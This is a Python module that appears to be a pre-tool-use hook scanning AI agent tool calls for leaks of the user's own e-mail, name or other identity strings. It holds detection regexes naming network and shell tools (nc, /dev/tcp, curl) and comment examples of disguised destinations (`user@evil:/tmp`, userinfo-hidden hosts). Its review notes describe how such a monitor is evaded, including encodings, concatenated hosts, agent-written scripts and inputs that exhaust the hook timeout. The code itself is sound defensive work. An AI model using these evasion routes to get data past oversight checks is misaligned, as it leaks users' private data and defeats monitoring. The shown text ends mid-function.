"""Find the user's own identity (e-mail addresses, name) in an outbound tool call.

The scanner knows WHO the user is, so it can look for exactly those strings in every disguise an agent might produce
(case, diacritics, URL/HTML encoding, base64, "name at domain dot com", separators) without flagging every other
e-mail address on the internet. Pure stdlib, no model: a typical tool call scans in well under a millisecond.
"""
import base64
import binascii
import html
import ipaddress
import re
import unicodedata
from dataclasses import dataclass, field, replace
from pathlib import Path
from urllib.parse import unquote, unquote_plus, urlsplit

from egress_guard.fuzzy import clean, contact_hits, fuzzy_hits

_FOLD = str.maketrans({"ł": "l", "Ł": "L", "ø": "o", "Ø": "O", "ß": "ss", "đ": "d", "Đ": "D", "æ": "ae", "œ": "oe"})
_B64 = re.compile(r"[A-Za-z0-9+/_-]{12,}={0,2}")
# a match starts only where a whitespace run starts: `\s*` restarted at every space of a long run (50 KB of newlines:
# 34 s, past the hook timeout; found while checking Astra review r6)
_AT = re.compile(r"(?<!\s)\s*+(?:\(at\)|\[at\]|\{at\}|<at>|\bat\b|\bmałpa\b|\bmalpa\b)\s*+", re.IGNORECASE)
_DOT = re.compile(r"(?<!\s)\s*+(?:\(dot\)|\[dot\]|\{dot\}|<dot>|\bdot\b|\bkropka\b)\s*+", re.IGNORECASE)
_SEP = re.compile(r"[\s._+\-]+")

# gh publishes issue / PR / gist text, not only `gh api` (issue #1, 2026-11-06), with options anywhere
# (`gh --repo o/r issue create`); package and image uploads too, also as `npm.cmd` (Astra review r4). Read token by
# token in one pass: a regex that looked for the subcommand after every "gh" was quadratic (16,000 of them took over
# 12 s, past the hook timeout, which lets the call through; Astra review r5).
_SENDS_AFTER = {
    "gh": {"api", "issue", "pr", "gist", "release", "repo", "discussion", "label", "project", "secret", "variable",
           "search"},
    "git": {"push", "pull", "fetch", "clone", "ls-remote", "submodule", "send-email", "request-pull"},
    **dict.fromkeys(("npm", "pnpm", "yarn", "bun", "cargo", "docker", "podman", "twine", "gem"),
                    {"publish", "push", "upload"}),
}
_GIT_PAIRS = {("remote", "add"), ("remote", "set-url"), ("archive", "--remote")}
_CMD_TOK = re.compile(r"""[;&|\n()`]|(?:[^\s'"\\;&|()<>`]+|'[^']*'|"(?:[^"\\]|\\.)*"|\\.)+""")
_SENDER = re.compile(r"\b(?:gh|git|npm|pnpm|yarn|bun|cargo|docker|podman|twine|gem)", re.I)


def publishes(text: str) -> bool:
    """A gh / git / package-manager command in `text` whose later word (same command, any position) sends."""
    if not _SENDER.search(text):
        return False
    active: set[str] = set()
    prev = ""
    for m in _CMD_TOK.finditer(text):
        tok = m.group(0)
        if len(tok) == 1 and tok in ";&|\n()`":
            active, prev = set(), ""
            continue
        w = tok.strip("'\"").lower()
        if any(w in _SENDS_AFTER[a] for a in active) or \
                ("git" in active and (prev, w.split("=", 1)[0]) in _GIT_PAIRS):
            return True
        name = re.sub(r"\.(?:exe|cmd|ps1|bat)$", "", re.split(r"[/\\]", w)[-1])
        name = "git" if re.fullmatch(r"git(?:-[\w-]+)?", name) else name
        if name in _SENDS_AFTER:
            active.add(name)
        prev = w
    return False


class _OrPublishes:
    """A compiled regex, or a command that publishes; `.search` is truthy when either matches."""

    def __init__(self, rx: re.Pattern, loose: bool = False):
        self.rx, self.loose = rx, loose

    def search(self, text: str):
        # loose (data files): a command inside a JSON / YAML string (`"postinstall": "gh issue create ..."`) is one
        # quoted token to the shell reader, so the quotes are dropped first (Astra review r6)
        return self.rx.search(text) or publishes(text) or (
            self.loose and publishes(re.sub(r"""['"`]""", " ", text))) or None


# Bash commands that send data off the machine. Anything else (git config, echo > file) is local and is not blocked
# in the default mode; `strict` scans every call.
NETWORK = _OrPublishes(re.compile(
    r"\b(?:curl|wget|http|https|httpie|xh|nc|ncat|netcat|telnet|ssh|scp|sftp|rsync|ftp|lftp|"
    r"invoke-webrequest|invoke-restmethod|iwr|irm|start-bitstransfer|"
    r"requests\.|urllib|httpx|aiohttp|fetch\(|axios|got\(|websocket|smtplib|sendmail|mail\s|"
    r"\bimport\s+socket\b|\bfrom\s+socket\s+import\b|\bsocket\.(?:socket|create_connection)\b|"
    r"\bcreate_connection\s*\(|"
    r"\b(?:git|ssh|svn)://|http\.client|ftplib|telnetlib|/dev/(?:tcp|udp)/)", re.IGNORECASE))


# Code that sends requests (for files the agent writes). Narrower than NETWORK: a note with a URL is not code.
NETWORK_CODE = re.compile(
    r"(?:\bcurl\b|\bwget\b|user-agent|urllib|\brequests\.|\bhttpx\b|aiohttp|http\.client|\bfetch\(|\baxios\b|"
    r"invoke-webrequest|invoke-restmethod|smtplib|net/http|reqwest|HttpClient|WebClient|"
    r"\bimport\s+requests\b|\bfrom\s+requests\b|\bsocket\.|websocket|grpc)", re.IGNORECASE)


_CHAIN = re.compile(r"&&|\|\||;|\n")


def _split_chain(text: str) -> list[str]:
    """Split a shell line at `&&`, `||`, `;` and newlines outside quotes: `curl x -d 'a;git config ...'` keeps the
    quoted body in the curl segment (final release review, 2026-10-31). An unclosed quote keeps the rest together."""
    # one regex pass instead of a loop per character: an 8 MB command took seconds here, and a hook that runs into
    # its timeout lets the call through
    segs, start = [], 0
    for m in _CHAIN_TOK.finditer(text):
        if m.group(0) in ("&&", "||", ";", "\n"):
            segs.append(text[start:m.start()])
            start = m.end()
    segs.append(text[start:])
    return segs


_CHAIN_TOK = re.compile(r"""\\.|'[^']*'?|"(?:\\.|[^"\\])*"?|&&|\|\||;|\n""", re.S)
# (`echo X > f && python send.py` reads f at run time, so a write next to a network command is kept)
_LOCAL_ONLY = re.compile(r"\s*(?:git\s+(?:config|commit|tag|log|show|status|add|init)\b|cd\s|export\s+GIT_)")
_EXT = r"\.(?:py|js|mjs|cjs|ts|sh|bash|ps1|rb|pl|php)"
_SCRIPT = re.compile(r'"([^"]+' + _EXT + r')"|\'([^\']+' + _EXT + r')\'|([^\s"\';|&]+' + _EXT + r')(?=[\s"\';|&]|$)')
_CD = re.compile(r'\bcd\s+(?:"([^"]+)"|([^\s;&|]+))')
DOC_SUFFIXES = {".md", ".markdown", ".txt", ".rst", ".adoc", ".html", ".htm", ".csv", ".tex", ".log"}
# data files: a CV in YAML that lists "WebSocket, gRPC" among skills is not code that sends (false block,
# 2026-11-09). A config that holds a User-Agent, or a command that sends (package.json `scripts`, CI `run:`), counts.
DATA_SUFFIXES = {".yaml", ".yml", ".json", ".toml", ".ini", ".cfg", ".xml"}
# Inline code (`node -e "fetch(...)"` in package.json scripts, `python -c` in a CI step) and network CALLS count;
# library names alone ("WebSocket, gRPC, Axios" in a skills list) do not (Astra review r5).
_DATA_SENDS = _OrPublishes(re.compile(
    r"user[-_ ]?agent|\b(?:curl|wget|httpie|xh|nc|ncat|netcat|socat|telnet|ssh|scp|sftp|rsync|ftp|lftp|"
    r"invoke-webrequest|invoke-restmethod|iwr|irm|sendmail)(?:\.exe)?\s+[-\w'\"$/]|"
    r"(?<![-\w.])(?:node(?:js)?|deno|bun|python[\d.]*|py|ruby|perl|php|pwsh|powershell|osascript)(?:\.exe)?"
    r"(?:\s+-[-\w]+)*?\s+(?:-[ecpr]\b|--eval\b|--print\b|-command\b|-encodedcommand\b|-c\b)|"
    r"\bfetch\s*\(\s*[^\s)]|\brequests\.\w+\s*\(\s*[^\s)]|urlopen|urllib\.request|http\.client|\bhttps?\.(?:get|request)\s*\(|"
    r"\bsocket\.\w+\s*\(|create_connection|new\s+WebSocket\s*\(|XMLHttpRequest|sendBeacon|\baxios\s*[.(]|"
    r"\bhttpx\.\w+\s*\(|aiohttp\.ClientSession|smtplib|"
    r"\b(?:from\s+(?:requests|urllib|http|socket|httpx|aiohttp|smtplib|ftplib)\b[\w.]*\s+import|"
    r"import\s+(?:requests|urllib|http\.client|socket|httpx|aiohttp|smtplib|ftplib)\b|"
    r"require\s*\(\s*['\"`](?:https?|net|axios|node-fetch|got)['\"`])|"
    r"(?<![-\w.])(?:node(?:js)?|deno|bun|python[\d.]*|py|ruby|perl|php|pwsh|powershell|bash|sh|zsh)(?:\.exe)?"
    r"(?:\s+-[-\w]+)*?\s*<<", re.I), loose=True)

# Code whose only destinations are this machine (a PDF generator that opens http://localhost:4173; 2026-11-09), or
# a file whose only destinations are allowed hosts. Proof by absence, so strict: every URL host is checked as an IP
# or name (`127.sink.test` is a name), every quoted host name and IP literal counts, and code that could build a
# destination the regexes cannot read (string concatenation, `${}` after //, join, char codes, decoding,
# protocol-relative `'//host'`) gets no exemption (Astra review r4).
# the scheme is bounded: `[a-z0-9+.-]*` restarted at every letter of "a.a.a..." (50 KB: 5.5 s; Astra review r6)
_SCHEME = r"(?<![a-z0-9+.-])[a-z][a-z0-9+.-]{0,31}://"
_URL_AUTH = re.compile(_SCHEME + r"([^/\s'\"`?#<>\\]+)", re.I)
# ... and pieces glued by formatting (`'%s.test'`, `f'{a}.test'`, `'{}.{}'`, adjacent literals `'sink' '.test'`),
# replace / concat / chr / octal / `\N{}` / `\u{}` escapes, and numeric hosts (Astra review r5)
_HDOT = r"[.\u3002\uff0e\uff61]"  # IDNA maps the ideographic full stops to a dot
_HIDE = re.compile(r"""(?<!['"`])['"`]\s*['"`](?!['"`])[\w.]|['"`]\s*\+|\+\s*['"`]|['"`]//|//\$\{|//%|//\{|\.join\s*\(|fromC(?:harCode|odePoint)|"""
                   r"""\batob\s*\(|Buffer\.from|decodeURI|\bunescape\s*\(|\\x[0-9a-f]{2}|\\u[0-9a-f]{4}|\\u\{|"""
                   r"""\\N\{|\\[0-7]{3}|b64decode|base64|rot.?13|\bchr\s*\(|\.concat\s*\(|bytes\s*\(\s*\[|bytearray|"""
                   r"""inet_ntoa|ip_address\s*\(\s*\d|\}""" + _HDOT + r"""[^\W\d_]{2,}\.?['"`/:]|""" + _HDOT
                   + r"""\$?\{|%[sdr]""" + _HDOT + "|" + _HDOT + r"""%[sdr]|"""
                   r"""\.replace\s*\(\s*['"`][^'"`]*['"`]\s*,\s*['"`][^'"`]*""" + _HDOT
                   + r"""|['"`](?:\d{8,10}|0x[0-9a-f]{6,8})['"`]""", re.I)
_QUOTED_HOST = re.compile(r"""['"`]\s*([^\W_](?:[\w.\u3002\uff0e\uff61-]*[^\W_])?""" + _HDOT
                          + r"""[^\W\d_][\w-]*""" + _HDOT + r"""?)(?::\d+)?(?:[/?#][^'"`]*)?\s*['"`]""")
# a quoted piece that starts or ends with a dot (`'sink.'`, `'.test'`) is half a host, unless it is a file extension
_PIECE = re.compile(r"""['"`](?:[^\W_][\w-]*""" + _HDOT + r"""|""" + _HDOT + r"""([^\W\d_][\w-]*))['"`]""")
_IP4 = re.compile(r"(?<![\w.])\d{1,3}(?:\.\d{1,3}){3}(?![\w.])")
_IP6 = re.compile(r"""['"`\[]([0-9a-f]{0,4}:[0-9a-f:.]*:[0-9a-f.]*)['"`\]]""", re.I)
# file names in quotes ('Jan-Kowalski-CV.pdf') are not hosts; only extensions that are no top-level domain
FILE_EXTS = {"pdf", "png", "jpg", "jpeg", "gif", "svg", "webp", "ico", "html", "htm", "css", "scss", "js", "mjs", "cjs",
             "jsx", "ts", "tsx", "json", "yaml", "yml", "toml", "ini", "txt", "csv", "xml", "log", "gz", "tar", "tgz",
             "docx", "xlsx", "pptx", "woff", "woff2", "ttf", "otf", "map", "lock", "env", "wasm", "mp4", "mp3", "wav"}


def _loopback(h: str) -> bool:
    h = h.strip("[]").lower().rstrip(".")
    if h == "localhost" or h.endswith(".localhost"):
        return True
    try:
        ip = ipaddress.ip_address(h)
    except ValueError:
        return False
    return ip.is_loopback or ip.is_unspecified


def _only_to(code: str, ok) -> bool:
    """Every destination written in `code` passes `ok`, and there is at least one URL."""
    if _HIDE.search(code):
        return False
    if any((p or "").lower() not in FILE_EXTS for p in _PIECE.findall(code)):
        return False
    hosts = []
    for auth in _URL_AUTH.findall(code):
        if "@" in auth:
            return False
        hosts.append(auth[:auth.find("]") + 1] if auth.startswith("[") else auth.rsplit(":", 1)[0])
    if not hosts or not all(ok(h) for h in hosts):
        return False
    rest = re.sub(_SCHEME + r"[^\s'\"`<>]*", " ", code, flags=re.I)
    # an escape ends a host as well as a quote does: `'sink.test\n'.strip()` (Astra review r6)
    rest = re.sub(r"\\[nrtvfab\s]", "'", rest)
    if any(not ok(h) and (h.endswith(".") or h.rsplit(".", 1)[-1].lower() not in FILE_EXTS)
           for h in _QUOTED_HOST.findall(rest)):
        return False
    for ip in _IP4.findall(rest) + _IP6.findall(rest):
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            continue
        if not ok(ip):
            return False
    return all(ip is None or ok(ip) for ip in map(_aton, _NUM_HOST.findall(rest)))


_NUM_HOST = re.compile(r"""['"`]((?:0x[0-9a-f]+|\d+)(?:\.(?:0x[0-9a-f]+|\d+)){0,3})['"`]""", re.I)


def _aton(s: str) -> str | None:
    """The IPv4 address the resolver reads from `8.8`, `8.8.2056`, `0x8.0x8.0x8.0x8`, `010.8.8.8` or `134744072`
    (inet_aton forms; Astra review r6), or None. One part counts only from 2**24 up: '4173' is a port, not a host."""
    parts = s.lower().split(".")
    try:
        nums = [int(p, 16) if p.startswith("0x") else int(p, 8) if len(p) > 1 and p.startswith("0") else int(p)
                for p in parts]
    except ValueError:
        return None
    if len(nums) == 1 and nums[0] < 2 ** 24:
        return None
    *head, last = nums
    if any(n > 255 for n in head) or last >= 256 ** (4 - len(head)):
        return None
    return ".".join(map(str, head + list(last.to_bytes(4 - len(head), "big"))))


def _local_only(code: str) -> bool:
    return _only_to(code, _loopback)


# `gh issue list -R JanKowalski/repo`: the owner part of the target repository is the user's own GitHub account,
# which GitHub issued; now that gh issue/pr/... are scanned, it would block every gh command on the user's own repos
# (false block, 2026-11-09). Only the parsed -R/--repo argument of a real gh command, names only: issue and PR text
# is scanned whole, also when it quotes a gh command (Astra review r4), and a remote URL
# (`git push https://github.com/jan-kowalski/r`) still counts (release review r7).
_TOK = re.compile(r"""(?:[^\s'"\\;&|()<>]+|'[^']*'|"(?:[^"\\]|\\.)*"|\\.)+""")
_REPO_OWNER = re.compile(r"""['"]?(?:https?://[^/\s'"]+/|[\w-]+(?:\.[\w-]+)+/(?=[\w-]+/))?([\w-]+)(?=/[\w.-])""", re.I)


_GH_FLAGS = {"--web", "-w", "--draft", "-d", "--comments", "-c", "--fill", "--fill-first", "--fill-verbose",
             "--yes", "-y", "--force", "--admin", "--auto", "--delete-branch", "--squash", "--merge", "--rebase",
             "--paginate", "--slurp", "--include", "-i", "--silent", "--verbose", "--dry-run", "--watch",
             "--exit-status", "--log", "--log-failed", "--confirm", "--public", "--private", "--internal", "--clone",
             "--recurse-submodules", "--no-maintainer-edit", "--latest", "--prerelease", "--archived", "--fork",
             "--source", "--help", "-h"}


def forge_cut(text: str) -> str:
    if not re.search(r"\bgh\b", text, re.I):
        return text
    spans, end, cmd, gh, want, val = [], 0, True, False, False, False
    for m in _TOK.finditer(text):
        if re.search(r"[;&|\n()]", text[end:m.start()]):
            cmd, gh, want, val = True, False, False, False
        end, tok, start = m.end(), m.group(0), None
        if cmd:
            if re.fullmatch(r"\w+=\S*", tok):
                continue  # GH_TOKEN=... gh ...
            gh, cmd = re.split(r"[/\\]", tok.strip("'\""))[-1].lower().removesuffix(".exe") == "gh", False
        elif gh:
            if want:
                start, want = m.start(), False
            elif val:  # `--body -RJanKowalski/x`: the value of the option before, posted text (Astra review r5)
                val = False
            elif tok.startswith("-") and not tok.startswith(("-R", "--repo")):
                # an option may take the next word, unless it is a known flag (`--draft --body -R...` read --body as
                # the value of --draft; Astra review r6). An unknown flag before -R costs a check, never a leak.
                val = "=" not in tok and tok not in _GH_FLAGS
            elif tok in ("-R", "--repo"):
                want = True
            elif tok.startswith("--repo="):
                start = m.start() + 7
            elif tok.startswith("-R"):
                start = m.start() + 2
            if start is not None and (o := _REPO_OWNER.match(text, start, m.end())):
                spans.append(o.span(1))
    for a, b in reversed(spans):
        text = text[:a] + "owner" + text[b:]
    return text


def _file_text(tool_input) -> str:
    path = tool_input.get("file_path") or tool_input.get("path") if isinstance(tool_input, dict) else None
    try:
        p = Path(path) if path else None
        if p and p.is_file() and p.stat().st_size < 2_000_000:
            return p.read_text(encoding="utf-8", errors="replace")
    except (OSError, ValueError):
        pass
    return ""


def fold(s: str) -> str:
    """Lower case, no diacritics (also the letters NFKD does not split, e.g. Polish ł)."""
    if s.isascii():  # nothing to fold; skips a per-character pass over large inputs
        return s.lower()
    s = unicodedata.normalize("NFKD", s.translate(_FOLD))
    return "".join(c for c in s if not unicodedata.combining(c)).lower()


def squash(s: str) -> str:
    """fold() without separators: 'Jan.Kowalski', 'jan_kowalski' and 'JanKowalski' become one string."""
    return _SEP.sub("", fold(s))


def views(text: str) -> list[str]:
    """The text as the receiving server may read it: decoded URLs and HTML, base64 runs, spelled-out @ and dots."""
    out, cur = [text], text
    lookalike = clean(text)  # Cyrillic/Greek look-alike letters, full-width, zero-width characters
    if lookalike != text:
        out.append(lookalike)
        cur = lookalike
    for _ in range(2):  # double URL-encoding
        nxt = unquote_plus(cur)
        if nxt == cur:
            break
        out.append(nxt)
        cur = nxt
    out.append(html.unescape(cur))
    runs = []
    for run in _B64.findall(text):
        # '/' is a base64 letter, so a token in a URL path ('/u/<b64>/x') is caught together with the path around it
        # and decodes misaligned; also try every contiguous span of '/'-separated pieces (the token may contain '/')
        runs.append(run)
        parts = run.split("/")
        if 1 < len(parts) <= 12:
            for i in range(len(parts)):
                for j in range(i + 1, len(parts) + 1):
                    piece = "/".join(parts[i:j])
                    if piece != run and len(piece) >= 12:
                        runs.append(piece)
    for run in runs:
        padded = run + "=" * (-len(run) % 4)
        for dec in (base64.b64decode, base64.urlsafe_b64decode):
            try:
                raw = dec(padded)
            except (binascii.Error, ValueError):
                continue
            s = raw.decode("utf-8", "ignore")
            if s and sum(c.isprintable() for c in s) >= 0.9 * len(s):
                out.append(s)
            break
    spelled = _DOT.sub(".", _AT.sub("@", cur))
    if spelled != cur:
        out.append(spelled)
    return out


@dataclass
class Identity:
    emails: list[str] = field(default_factory=list)
    names: list[str] = field(default_factory=list)  # full names, e.g. "Jan Kowalski"
    extra: list[str] = field(default_factory=list)  # other strings that must never leave: phone, street, nickname
    # names guessed, not configured (e.g. "First Last" spelled by a first.last@ address): only the full name counts,
    # never the surname alone, so a guess that is really a team mailbox ("info.support@") cannot block "support-bot"
    derived_names: list[str] = field(default_factory=list)
    allow_hosts: list[str] = field(default_factory=list)  # destinations where the identity may go (own git host...)
    # strings that contain the identity but are fine to send (a folder or domain named after the user, a public
    # handle); they are cut out of the call before matching, case-insensitively
    ignore: list[str] = field(default_factory=list)
    # 0.2.0: look-alike spellings and e-mails in contact fields; "ask" (the user decides), "deny" or "off"
    fuzzy: str = "ask"
    contact_fields: str = "ask"
    # addresses agents may send without asking (User-Agent, From, forms); never list your private address here
    allow_emails: list[str] = field(default_factory=list)
    first_alone: bool = False  # also ask about the first name on its own (useful for a rare first name)

    def needles(self) -> list[tuple[str, str, str]]:
        """(kind, folded needle, squashed needle) for every form we look for."""
        out = []
        for e in self.emails:
            e = e.strip()
            if "@" not in e:
                continue
            local, domain = e.rsplit("@", 1)
            out.append(("email", fold(e), squash(e)))
            base = local.split("+", 1)[0]  # plus-addressing: jan+crates@x.com is still jan@x.com
            if base != local:
                out.append(("email", fold(f"{base}@{domain}"), squash(f"{base}@{domain}")))
            name_parts = {squash(p) for n in self.names + self.derived_names for p in n.split()}
            # the mailbox name alone identifies the user, unless it is just a first name (agnieszka@...) or short
            if len(squash(base)) >= 6 and squash(base) not in name_parts:
                out.append(("email-local", fold(base), squash(base)))
        for n in self.names:
            parts = [p for p in re.split(r"\s+", n.strip()) if p]
            if len(parts) >= 2:
                first, last = parts[0], parts[-1]
                for form in (f"{first} {last}", f"{last} {first}", f"{first[0]}. {last}", f"{last}, {first}"):
                    out.append(("name", fold(form), squash(form)))
                out.append(("first", fold(first), squash(first)))  # not matched alone; tells people apart
                if len(last) >= 5:
                    # Polish inflection: Kowalski -> Kowalskiego, Wiśniewska -> Wiśniewskiej; drop a final vowel
                    stem = fold(last)[:-1] if len(last) >= 6 and fold(last)[-1] in "aeiouy" else fold(last)
                    out.append(("surname", stem, squash(stem)))
        for n in self.derived_names:
            parts = [p for p in re.split(r"\s+", n.strip()) if p]
            if len(parts) >= 2:
                for form in (f"{parts[0]} {parts[-1]}", f"{parts[-1]} {parts[0]}", f"{parts[-1]}, {parts[0]}"):
                    out.append(("name", fold(form), squash(form)))
        for x in self.extra:
            if len(squash(x)) >= 5:
                # a phrase ("Jan Desktop") is matched as a whole phrase, like a name; one word keeps inflection
                out.append(("extra-phrase" if len(x.split()) >= 2 else "extra", fold(x), squash(x)))
        return out


@dataclass
class Finding:
    kind: str
    needle: str
    where: str


def _unaccent(s: str) -> str:
    """fold() without lower-casing, so capitalisation survives at the same positions."""
    if s.isascii():
        return s
    s = unicodedata.normalize("NFKD", s.translate(_FOLD))
    return "".join(c for c in s if not unicodedata.combining(c))


_PRECEDING_NAME = re.compile(r"([A-Z][a-z]{2,})[ _]$")
_TITLES = {"mr", "mrs", "ms", "dr", "pan", "pani", "prof"}


def _is_user_first(word: str, firsts: set[str]) -> bool:
    """'Jana', 'Pawła', 'Zofii' are the user's first name inflected (Polish): compare a common stem."""
    return word in _TITLES or any(word[:max(3, len(f) - 2)] == f[:max(3, len(f) - 2)] for f in firsts)


def _phrase_at(uv: str, sn: str) -> bool:
    """The squashed phrase `sn` occurs in `uv` (case kept, no diacritics), letters optionally split by separators,
    and starts and ends on a word boundary. A boundary is a non-letter or a lower->Upper step, so 'JanKowalskiBot',
    'jan_kowalski84' and 'Jan.Kowalski' match, but 'Admin Users Guide' does not match the phrase 'Admin User'
    (Codex review r2, 2026-10-29: substring matching blocked ordinary words)."""
    pat = r"[\s._+\-]*".join(re.escape(c) for c in sn)
    for m in re.finditer(pat, uv, re.IGNORECASE):
        a, b = m.start(), m.end()
        start_ok = a == 0 or not uv[a - 1].isalpha() or (uv[a - 1].islower() and uv[a].isupper())
        end_ok = b == len(uv) or not uv[b].isalpha() or (uv[b - 1].islower() and uv[b].isupper())
        if start_ok and end_ok:
            return True
    return False


def _hits(text: str, needles) -> list[Finding]:
    found = []
    firsts = {fn for kind, fn, _ in needles if kind == "first"}
    for v in views(text):
        uv = _unaccent(v)
        fv = uv.lower()
        sv = squash(v)
        for kind, fn, sn in needles:
            if kind == "first":
                continue
            if kind in ("surname", "email-local", "extra"):
                # a word on its own, plus up to 4 letters of Polish inflection, with a word boundary before it
                extra = 4 if kind == "surname" else 3
                for m in re.finditer(r"(?<![a-z0-9])" + re.escape(fn) + r"[a-z]{0,%d}(?![a-z0-9])" % extra, fv):
                    if kind == "surname":
                        # 'Anna_Kowalski' or 'Anna Kowalska' is someone else with the user's surname
                        prev = _PRECEDING_NAME.search(uv[:m.start()])
                        if prev and not _is_user_first(prev.group(1).lower(), firsts):
                            continue
                    found.append(Finding(kind, fn, v[:80]))
                    break
            elif kind in ("name", "extra-phrase"):
                # long phrases also without separators ('JanKowalski'); short ones only as written, as whole words
                if (_phrase_at(uv, sn) if len(sn) >= 8 else
                        re.search(r"(?<![a-z])" + re.escape(fn) + r"(?![a-z])", fv)):
                    found.append(Finding(kind.replace("-phrase", ""), fn, v[:80]))
            elif fn in fv or (len(sn) >= 8 and sn in sv):
                found.append(Finding(kind, fn, v[:80]))
    return found


def strings_of(obj) -> list[str]:
    if isinstance(obj, str):
        return [obj]
    if isinstance(obj, dict):
        return [s for v in obj.values() for s in strings_of(v)]
    if isinstance(obj, (list, tuple)):
        return [s for v in obj for s in strings_of(v)]
    return []


_NON_HTTP = re.compile(r"\b(?:scp|sftp|ssh|rsync|nc|ncat|socat|telnet|ftp|sendmail)\b|\S@[\w.-]+:")


# allow_hosts does not apply to shell commands: a shell line can name an allowed host and send elsewhere in too many
# ways (pipes, substitutions, git ssh "host:path", gh --hostname); found one by one in the release review, 2026-10-30
SHELL_TOOLS = ("Bash", "PowerShell", "exec_command", "shell")
FILE_TOOLS = ("Write", "Edit", "MultiEdit", "apply_patch", "NotebookEdit")
# fields of a fetch / navigate call that send nothing; WebFetch's prompt goes to the local summariser, not the site
_NAV_KEYS = {"url", "tabId", "tab_id", "timeout", "waitUntil", "wait_until", "newTab", "new_tab"}


def _one_destination(tool_name: str, tool_input, allow_hosts: list[str]) -> bool:
    """An allowed host exempts a non-shell call only when the call's single destination is its `url`: WebFetch
    {url, prompt} or a browser navigate {url}. Any other shape (evaluate, a `host` or `to` field beside an allowed
    url, keys holding hosts) gets the full scan: a text heuristic over arbitrary MCP fields cannot prove there is one
    destination (Sol review r3, Astra review r4)."""
    if not isinstance(tool_input, dict) or not isinstance(tool_input.get("url"), str):
        return False
    keys = _NAV_KEYS | ({"prompt"} if tool_name == "WebFetch" else set())
    for k, v in tool_input.items():
        if k not in keys or (k not in ("url", "prompt") and not (
                isinstance(v, (bool, int, float)) or isinstance(v, str) and re.fullmatch(r"[\w-]{0,40}", v))):
            return False
    return host_allowed(tool_input["url"], allow_hosts)


def _allowed(h: str, allow_hosts: list[str]) -> bool:
    h = h.strip("[]").lower().rstrip(".")
    return _loopback(h) or any(h == a or h.endswith("." + a) for a in allow_hosts)


_PROTO_REL = re.compile(r"(?<![\w:/])//([A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)*\.[A-Za-z]{2,})(?=[/:?#\s'\"]|$)")
# inputs above this size get exact checks only: fuzzy matching over every decoded view of megabytes of text
# outran the hook timeout (8 MB: 13 s; Sol review r2, 2026-11-01). Tool calls this large are rare.
FUZZY_MAX = 256_000


def host_allowed(text: str, allow_hosts: list[str]) -> bool:
    if _NON_HTTP.search(text):
        return False  # `scp f user@evil:/tmp # https://github.com`: the real target is not the URL
    hosts = []
    # every destination counts: URLs in the raw and URL-decoded text (`?next=https%3A%2F%2Fsink.test`), and
    # protocol-relative `//sink.test/` (fetch('//sink.test/?u=...') next to an allowed url; Sol review r2, 2026-11-01)
    for t in dict.fromkeys((text, unquote(text), unquote(unquote(text)))):
        # overlapping: `https://ok.org/?next=https://sink.test` holds two destinations
        # (scheme and authority only: capturing each overlapping URL to its end was quadratic, 50 KB of `http://`
        # took 6 s; found while checking Astra review r6)
        for url in re.findall(r"(?=(https?://(?=[^\s'\"<>])[^\s'\"<>/?#]*))", t, re.IGNORECASE):
            authority = url.split("://", 1)[1]
            try:
                parts = urlsplit(url)
                host = parts.hostname
            except ValueError:
                return False
            # `https://trusted.test:pw@sink.test/`: userinfo hides the real host (final review, 2026-10-31);
            # a backslash in the host part (`https://sink.test\.trusted.test`) is a path separator to browsers.
            # A backslash later in the URL (a `\n` in code after it) is not (false block, 2026-11-01).
            if not host or "@" in authority or "\\" in authority:
                return False
            hosts.append(host.rstrip("."))
        for host in _PROTO_REL.findall(t):
            hosts.append(host.lower().rstrip("."))
    return bool(hosts) and all(any(h == a or h.endswith("." + a) for a in allow_hosts) for h in hosts)


def _runs_network_script(command: str, cwd: str | None) -> bool:
    """`SEC_UA="<identity>" python fetch.py`: the command names no network tool, but the script it runs may send the
    data it gets through argv or env (seen in the reproduction, 2026-10-26). Read the scripts it runs."""
    for m in _SCRIPT.finditer(command):
        base = Path(cwd) if cwd else Path.cwd()
        for c in _CD.finditer(command[:m.start()]):  # `cd "dir" && python x.py`; a later `cd` does not count
            d = Path(c.group(1) or c.group(2))
            base = d if d.is_absolute() else base / d
        p = Path(m.group(1) or m.group(2) or m.group(3))
        for cand in (p,) if p.is_absolute() else (base / p, p):
            try:
                if cand.is_file() and cand.stat().st_size < 2_000_000 and \
                        NETWORK_CODE.search(cand.read_text(encoding="utf-8", errors="replace")):
                    return True
            except OSError:
                continue
    return False


def safe_ignore(ident: Identity) -> list[str]:
    """`ignore` entries that are used. `ignore` only hides name matches (e-mails are always checked on the uncut
    call), and only a literal token: an entry with whitespace or `%`, one that is a piece of a protected form
    ("kowalski", "Jan-Kowalski"), or one that hides the name only in an encoded form (base64, URL encoding) is
    dropped. A token that spells the name out ("blogJanKowalskiSite") is kept."""
    needles = ident.needles()
    forms = [sq for _, _, sq in needles if sq]
    keep = []
    for x in ident.ignore:
        x = str(x)
        sx = squash(x)
        if not sx or "%" in x or any(c.isspace() for c in x.strip()) or any(sx in f for f in forms):
            continue
        if _hits(x, needles) and not any(f in sx for f in forms):
            continue  # it matches only after decoding
        keep.append(x)
    return keep


def scan_tool_call(tool_name: str, tool_input, ident: Identity, strict: bool = False,
                   cwd: str | None = None) -> list[Finding]:
    """Findings for one PreToolUse event (Claude Code and Codex send the same tool_name / tool_input shape)."""
    texts = strings_of(tool_input)
    joined = "\n".join(texts)
    if isinstance(tool_input, dict) and isinstance(tool_input.get("workdir"), str):
        cwd = tool_input["workdir"]  # Codex exec_command runs in its own workdir
    if tool_name in ("Bash", "PowerShell", "exec_command", "shell") and not strict:
        if not NETWORK.search(joined) and not _runs_network_script(joined, cwd):
            return []
        # `git config user.email X && curl ...`: the local part of a chain does not send anything. A huge line or one
        # of thousands of segments is scanned whole: per-segment checks took 54 s for 8 MB of `curl x;`, and a hook
        # past its timeout lets the call through
        segs = [seg for t in texts for seg in _split_chain(t)] if len(joined) <= FUZZY_MAX else texts
        if len(segs) <= 200:
            texts = [seg for seg in segs
                     if not _LOCAL_ONLY.match(seg) or NETWORK.search(seg) or _runs_network_script(seg, cwd)]
    if tool_name in ("Write", "Edit", "MultiEdit", "apply_patch", "NotebookEdit") and not strict:
        # A local file is fine, unless it is code that talks to the network: in the reproduction (2026-10-26) the
        # e-mail went out from a script the agent wrote (User-Agent constant) and then ran as `python script.py`,
        # a command that shows no data. For an edit, the network code may sit elsewhere in the file, so read it.
        path = str(tool_input.get("file_path") or tool_input.get("path") or "") if isinstance(tool_input, dict) else ""
        suffix = Path(path).suffix.lower()
